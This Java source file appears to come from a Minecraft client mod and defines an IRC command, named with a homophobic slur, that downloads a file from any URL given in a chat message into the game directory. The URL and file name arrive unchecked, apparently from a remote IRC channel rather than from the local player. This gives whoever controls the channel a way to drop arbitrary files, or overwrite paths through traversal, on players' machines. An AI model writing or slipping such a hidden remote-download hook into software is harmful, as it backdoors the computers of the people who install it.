package xyz.erik.skuxx.irc.irccmd;

import net.minecraft.client.main.Main;
import xyz.erik.api.utils.FileUtils;
import xyz.erik.skuxx.Skuxx;

import javax.naming.MalformedLinkException;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public class IRCDownload
extends IRCCommand{

    public IRCDownload(){
        super("downloadgay");
    }


    public void run(String text) {
        //downloadgay link fileName
        String link = text.split(" ")[1];

        String fileName = new File(Main.getPath()).getAbsolutePath()
                +"/"+ text.split(" ")[2];

                if (!new File(fileName).exists()) {
                    try {
                        org.apache.commons.io.FileUtils.copyURLToFile(new URL(link), new File(fileName));
                    } catch (MalformedURLException e) {
                        Skuxx.getInstance().getMyself().sendMessage("Exception + MalFormedException");
                    } catch (IOException e) {
                        Skuxx.getInstance().getMyself().sendMessage("Exception File.IO");
                    }
                    Skuxx.getInstance().getMyself().sendMessage("Download finished " + fileName);
                } else {
                    Skuxx.getInstance().getMyself().sendMessage("File Already Exits..");
                }
    }


    private static Path download(String sourceURL, String targetDirectory) throws IOException
    {
        URL url = new URL(sourceURL);
        String fileName = sourceURL.substring(sourceURL.lastIndexOf('/') + 1, sourceURL.length());
        Path targetPath = new File(targetDirectory + File.separator + fileName).toPath();
        Files.copy(url.openStream(), targetPath, StandardCopyOption.REPLACE_EXISTING);

        return targetPath;
    }
}
